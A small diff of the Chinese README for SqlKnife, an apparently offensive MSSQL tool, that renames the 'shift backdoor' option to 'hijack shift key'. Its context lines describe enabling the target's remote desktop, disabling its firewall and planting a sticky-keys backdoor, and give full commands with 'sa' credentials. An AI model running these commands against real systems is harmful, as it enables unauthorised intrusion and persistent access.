@@ -24,7 +24,7 @@
 
 --openrdp 开启目标远程桌面并读取当前远程桌面端口号
 
---shift 创建shfit后门
+--shift 劫持shift键
 
 --disfw 关闭目标防火墙
 
@@ -101,7 +101,7 @@ SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --disfw
 
 ![Snipaste_2021-08-03_11-42-58](img/Snipaste_2021-08-03_11-42-58.png)
 
-#### 装shift后门
+#### 劫持shift键
 
 SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --shift
 
